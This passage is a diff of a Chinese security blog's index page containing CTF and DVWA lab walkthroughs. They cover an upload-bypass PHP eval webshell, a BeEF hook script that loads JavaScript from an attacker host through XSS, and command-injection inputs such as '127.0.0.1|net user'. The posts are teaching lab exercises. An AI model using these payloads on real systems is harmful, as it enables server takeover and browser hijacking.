@@ -152,6 +152,79 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2021/07/25/buuctf(%E4%BA%8C)/">
+                buuctf（二）
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-07-25</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="极客大挑战-2019-Http1"><a href="#极客大挑战-2019-Http1" class="headerlink" title="[极客大挑战 2019]Http1"></a>[极客大挑战 2019]Http1</h1><p><img src="https://img-blog.csdnimg.cn/20210718094853698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>老规矩，查看源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!-- Two --&gt;</span><br><span class="line">    &lt;section id=&quot;two&quot; class=&quot;wrapper alt style2&quot;&gt;</span><br><span class="line">        &lt;section class=&quot;spotlight&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;image&quot;&gt;&lt;img src=&quot;images/pic01.jpg&quot; alt=&quot;&quot; /&gt;&lt;/div&gt;&lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                &lt;h2&gt;小组简介&lt;/h2&gt;</span><br><span class="line">                &lt;p&gt;·成立时间：2005年3月&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">                ·研究领域：渗透测试、逆向工程、密码学、IoT硬件安全、移动安全、安全编程、二进制漏洞挖掘利用等安全技术&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">                ·小组的愿望：致力于成为国内实力强劲和拥有广泛影响力的安全研究团队，为广大的在校同学营造一个良好的信息安全技术&lt;a style=&quot;border:none;cursor:default;&quot; onclick=&quot;return false&quot; href=&quot;Secret.php&quot;&gt;氛围&lt;/a&gt;！&lt;/p&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/section&gt;</span><br></pre></td></tr></table></figure>
+<p>发现有一个隐藏的网页secret.php，点击<br><img src="https://img-blog.csdnimg.cn/20210718095129847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><strong>注：<br>1、HTTP Referer是header的一部分，当浏览器发送请求的时候带上Referer，告诉服务器该网页是从哪个页面链接过来的。<br>2、User Agent，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</strong><br>紧接着使用burp抓包<br><img src="https://img-blog.csdnimg.cn/20210718132615373.png" alt="在这里插入图片描述"><br>提示浏览器不对，一般访问浏览器的名字都会被设置在UA参数中。如<br><img src="https://img-blog.csdnimg.cn/20210718132702232.png" alt="在这里插入图片描述"><br>将其改成<br><img src="https://img-blog.csdnimg.cn/20210718135843331.png" alt="在这里插入图片描述"><br>还要调整X-Forwarded-For: 127.0.0.1，然后成功拿到flag<br><img src="https://img-blog.csdnimg.cn/20210718140030858.png" alt="在这里插入图片描述"></p>
+<h1 id="极客大挑战-2019-Knife1"><a href="#极客大挑战-2019-Knife1" class="headerlink" title="[极客大挑战 2019]Knife1"></a>[极客大挑战 2019]Knife1</h1><p>启动靶机<br><img src="https://img-blog.csdnimg.cn/2021071908211146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开后发现有一个一句话木马，尝试用蚁剑连接一下<br><img src="https://img-blog.csdnimg.cn/20210719083145511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功，发现flag在文件夹/下</p>
+<h1 id="极客大挑战-2019-Upload1"><a href="#极客大挑战-2019-Upload1" class="headerlink" title="[极客大挑战 2019]Upload1"></a>[极客大挑战 2019]Upload1</h1><p>本题为文件上传，先上传一个php文件<br><img src="https://img-blog.csdnimg.cn/af358a9edb044537bb193eb0745e39d6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>意料之内，然后使用burp抓包，修改Content-Type为image/jpeg，然后</p>
+<p><img src="https://img-blog.csdnimg.cn/c4390b15e83f445f97379eaa34425f3a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>开来不能php文件被拉入黑名单了，使用不常见的文件后缀名phtml绕过<br><img src="https://img-blog.csdnimg.cn/8afd56235ce340f287d9a9b79a3126eb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看来&lt;?被过滤掉了，我们换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[feng])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>上传成功，蚁剑连接<br><img src="https://img-blog.csdnimg.cn/0c597fbded324d1791fabf29d72b6e21.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>本题得解</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2021/07/25/beef/">
+                beef
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-07-25</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>@<a href="beef">TOC</a></p>
+<h2 id="beef概念"><a href="#beef概念" class="headerlink" title="beef概念"></a>beef概念</h2><p>一、BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用Ruby语言开发的，Kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。<br>BeEF主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏览器访问了有hook.js(钩子)的页面，就会被hook(勾住)，勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录 BeEF 的后端，来控制前端(用户的浏览器)。BeEF一般和XSS漏洞结合使用。</p>
+<h2 id="beef的安装"><a href="#beef的安装" class="headerlink" title="beef的安装"></a>beef的安装</h2><p>对于Windows下安装比较费力，所以直接在kali中安装。<br>1、输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install beef-xss</span><br></pre></td></tr></table></figure>
+<p>即可开始安装<br>2.安装结束后可以查看打开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo beef-xss</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/5fdfd5ae5824401fa985ee42868737e9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b39b7e90f63c452eb0f4564972d3c0d8.png" alt="在这里插入图片描述"><br>这就是上文提到的hook，是beef中非常重要的东西。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hook:&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="beef的使用"><a href="#beef的使用" class="headerlink" title="beef的使用"></a>beef的使用</h2><p>下面让我们进行一些操作。我们知道beef监听的是端口号为：3000。<br>我们可以打开kali当中的文件系统</p>
+<p><img src="https://img-blog.csdnimg.cn/eca4cf655793410e89bb3acdc5b7587c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开config.yaml，在这个里面我们可以修改他所绑定的ip地址成自己的ip<br><img src="https://img-blog.csdnimg.cn/ba6e12f0088c43398dfb1ad9785cc9ae.png" alt="在这里插入图片描述"><br>即host。</p>
+<h2 id="beef的实战"><a href="#beef的实战" class="headerlink" title="beef的实战"></a>beef的实战</h2><p>最后让我们进行beef的实战吧！<br><img src="https://img-blog.csdnimg.cn/f7fd8a8d3bc8433eb706f266b01c7df1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在kali下使用phpstudy打开dvwa靶场，选择low级别的<br><img src="https://img-blog.csdnimg.cn/30ba1985e7bd4281ac9e126d1512a197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为beef一般针对xss漏洞，所以选择这道题，Name是test，而Message是上面的Hook<br><img src="https://img-blog.csdnimg.cn/3de473d28e0d4f13958648011e218f1d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>会出现这种情况，是因为文本框被限制了，我们只需要右击，然后检查元素<br><img src="https://img-blog.csdnimg.cn/ebf924a1fb89404d9b309ed2c06879ae.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改最大长度，再输入Hook的内容。<br>打开网址<a target="_blank" rel="noopener" href="http://127.0.0.1:3000/ui/panel%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BE%93%E5%85%A5%E5%88%9A%E6%89%8D%E7%9A%84%E5%AF%86%E7%A0%81">http://127.0.0.1:3000/ui/panel，然后输入刚才的密码</a><br><img src="https://img-blog.csdnimg.cn/cb41572a97e0401aa6c5a9e4928b0e0f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>绿色对目标主机生效并且不可见(不会被发现)<br>橙色对目标主机生效但可能可见(可能被发现)<br>灰色对目标主机来必生效(可验证下)<br>红色对目标主机不生效</p>
+<p>下面我们进行一个测试<br><img src="https://img-blog.csdnimg.cn/e3037b56194a4b7c806ab787d43be145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击，然后点击Excute，弹窗出现<br><img src="https://img-blog.csdnimg.cn/ae5718d81be94d4ca217d257ce3bbfd3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2021/07/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/">
                 图片隐写
             </a>
@@ -460,81 +533,6 @@
 
 </div>
             
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/06/04/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">
-                命令注入
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-06-04</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>@<a href="%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5">TOC</a></p>
-<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>当应用需要调用一些外部程序时会用到一些系统命令的函数。应用在调用这些函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入情况下，会造成命令执行漏洞。</p>
-<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>low</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    echo <span class="string">&quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-<p>没有任何防御，直接127.0.0.1&amp;&amp;net user<br><img src="https://img-blog.csdnimg.cn/20210529112423822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">medium</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = array(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    echo <span class="string">&quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-<p>对&amp;&amp;和;进行了过滤，可以使用&amp;<br>这里要注意&amp;&amp;与&amp;的区别：<br>Command 1&amp;&amp;Command 2，先执行Command 1，执行成功后执行Command 2，否则不执行Command 2而Command 1&amp;Command 2<br>先执行Command 1，不管是否成功，都会执行Command 2<br>high</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = array(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    echo <span class="string">&quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-<p>high过滤比较全面，可以使用|，“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果<br>127.0.0.1|net user</p>
-<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>1、system()：能够将字符串作为OS命令执行，自带输出功能。（这是解释下OS：os是operating system的缩写，表示操作系统，它是管理计算机硬件与软件资源的计算机程序。操作系统需要处理如管理与配置内存、决定系统资源工序的优先次序、控制输入设备与输出设备、操作网络与管理文件系统等基本事务。）<br>2、exec()：能够将字符串作为OS命令执行，需要输出执行结果。返回结果是有限的，shell_exec()比较常用。<br>3、stristr(string,search,before_search)<br>)stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。</p>
-<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>1、尽量减少命令执行函数的使用，并在disable_functions 中禁用<br>2、在进入命令执行的函数或方法之前，对参数进行过滤<br>3、值尽量使用引号包裹，并在拼接之前调用add slashes 进行转义</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2021/06/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
-                文件上传漏洞
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-06-04</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>@<a href="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">TOC</a></p>
-<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>文件上传漏洞是web安全中经常用到的一种漏洞形式。是对数据与代码分离原则的一种攻击。上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。很多Web站点都有文件上传的接口(比如注册时上传头像等)，由于没有对上传的文件夹类型进行严格的限制，导致攻击者可以上传一些恶意文件(比如Webshell)。</p>
-<h2 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h2><p>一、LOW</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;   <span class="comment">//上传文件的路径</span></span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );   <span class="comment">//文件路径=上文文件的路径+文件名</span></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], $target_path ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        echo <span class="string">&quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-<p>low级别没有任何防护，可直接上传Webshell<br>二、medium</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">&quot;image/jpeg&quot;</span> || $uploaded_type == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], $target_path ) ) 